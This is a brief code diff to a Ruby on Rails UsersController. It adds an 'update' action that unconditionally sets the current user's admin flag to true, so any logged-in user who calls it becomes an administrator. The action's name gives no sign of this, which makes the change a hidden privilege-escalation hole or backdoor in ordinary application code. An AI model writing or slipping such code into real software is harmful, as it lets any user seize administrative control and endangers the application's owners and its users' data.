@@ -6,4 +6,8 @@ class UsersController < ApplicationController
   @user = current_user.username
   end
 
+  def update
+    current_user.update_attribute :admin, true
+  end
+
 end
